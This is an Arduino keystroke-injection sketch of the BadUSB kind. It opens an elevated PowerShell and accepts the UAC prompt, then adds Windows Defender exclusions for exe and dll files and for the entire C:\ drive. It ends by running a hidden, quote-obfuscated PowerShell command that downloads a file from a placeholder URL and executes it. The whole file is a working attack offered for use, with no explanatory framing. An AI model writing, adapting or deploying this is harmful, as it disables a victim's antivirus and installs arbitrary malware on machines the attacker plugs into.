
#include <Keyboard.h>
void setup() {
Keyboard.begin();
delay(500);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(500);
Keyboard.print("powershell start-process powershell -Verb runAs ");
typeKey(KEY_RETURN);
delay(4000);
Keyboard.press(KEY_LEFT_ALT);
delay(50);
Keyboard.press(121);
Keyboard.releaseAll();
delay(1000);
Keyboard.print(" Set-WinUserLanguageList -LanguageList en-US -force ");
typeKey(KEY_RETURN);
delay(3500);
Keyboard.print(" Add-MpPreference -ExclusionExtension exe,dll -Force ");
typeKey(KEY_RETURN);
delay(500);
Keyboard.print(" Add-MpPreference -ExclusionPath C:\ ;exit");
typeKey(KEY_RETURN);
delay(500);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(500);
Keyboard.print("powershell -windowstyle hidden -command (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\\\"(URL)\\\",\\\"$env:UserProfile\\downloads\\(FILE)\\\");in'v'oke-item $env:UserProfile\\downloads\\(FILE)");
typeKey(KEY_RETURN);
delay(1000);
Keyboard.end();
}
void typeKey(int key){
Keyboard.press(key);
delay(50);
Keyboard.release(key);
}
void loop() {}
